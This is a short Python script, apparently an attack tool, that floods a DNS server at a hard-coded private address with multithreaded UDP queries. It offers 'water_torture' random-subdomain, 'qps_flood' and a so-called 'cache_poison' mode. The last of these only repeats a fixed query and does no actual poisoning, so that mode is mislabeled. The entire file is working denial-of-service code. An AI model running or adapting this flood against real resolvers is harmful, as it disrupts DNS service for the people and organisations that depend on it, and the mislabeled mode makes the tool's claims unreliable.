import argparse
import random
import string
import time
import socket
import threading
import dns.message
import dns.rdatatype

TARGET_IP = "10.5.0.20"
TARGET_PORT = 53

def get_random_string(length=10):
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for _ in range(length))

def flood_worker(duration_sec, mode, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration_sec

    while time.time() < end_time and not stop_event.is_set():
        if mode == "water_torture":
            subdomain = get_random_string(10)
            qname = f"{subdomain}.example.com."
        elif mode == "qps_flood":
            qname = f"service-{random.randint(1, 100)}.example.com."
        else:
            qname = "target-banking.example.com."

        try:
            msg = dns.message.make_query(qname, dns.rdatatype.A)
            sock.sendto(msg.to_wire(), (TARGET_IP, TARGET_PORT))
        except Exception:
            pass

    sock.close()

def start_attack(mode, duration_sec=15, threads_count=12):
    print(f"[*] Launching {mode.upper()} attack using {threads_count} threads for {duration_sec}s...")
    stop_event = threading.Event()
    threads = []

    for _ in range(threads_count):
        t = threading.Thread(target=flood_worker, args=(duration_sec, mode, stop_event))
        t.start()
        threads.append(t)

    time.sleep(duration_sec)
    stop_event.set()
    for t in threads:
        t.join()
    print(f"[+] Attack finished.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--mode", choices=["water_torture", "qps_flood", "cache_poison"], required=True)
    parser.add_argument("--duration", type=int, default=15)
    parser.add_argument("--threads", type=int, default=12)
    args = parser.parse_args()

    start_attack(args.mode, args.duration, args.threads)
